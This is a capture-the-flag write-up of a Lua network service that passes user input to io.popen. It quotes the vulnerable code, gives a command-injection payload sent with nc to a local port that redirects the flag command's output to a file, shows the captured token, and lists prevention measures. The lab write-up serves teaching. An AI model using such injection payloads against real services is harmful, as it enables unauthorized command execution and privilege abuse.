# Level 11 - Lua Script Command Injection

## Objective
Exploit a Lua network service to execute commands as `flag11`.

## My Notes

Found a Lua script running a server:
```bash
cat level11.lua
```

```lua
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")  -- VULNERABLE!
  data = prog:read("*all")
  prog:close()
  return data
end
```

The dangerous line concatenates user input directly into a shell command. `io.popen()` executes commands in a shell - shell metacharacters will be interpreted.

The service listens on port 5151. If I send `$(getflag)`, the command becomes `echo $(getflag) | sha1sum`. The shell expands `$()`, executing getflag. But output goes to sha1sum, so I redirect to a file:

```bash
echo '$(getflag > /tmp/flag11)' | nc 127.0.0.1 5151
cat /tmp/flag11
# Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

Token: `fa6v5ateaw21peobuub8ipe6s`

## Key Takeaways

**io.popen() in Lua:** Executes command in shell, returns file handle. Dangerous with user input. Equivalent to `popen()` in C, `os.popen()` in Python.

**String concatenation injection:** User input concatenated directly into command allows injection via shell metacharacters like `$()`, `` ` ``, `;`, `|`, etc.

**Output redirection strategy:** When you can inject but can't see output, redirect to file, send over network, or write to accessible directory.

**Why it runs as flag11:** The script has setuid permissions, so `io.popen()` runs commands as flag11.

## Tools Used
- `nc` - Connect to service
- `echo` - Send payload
- `cat` - Read captured output

## Prevention
- Never concatenate user input into commands
- Use libraries instead of shell (e.g., crypto library for SHA1)
- Input validation - whitelist allowed characters
- Shell escaping if you must use shell
- Run services with minimal privileges, don't use setuid on network services
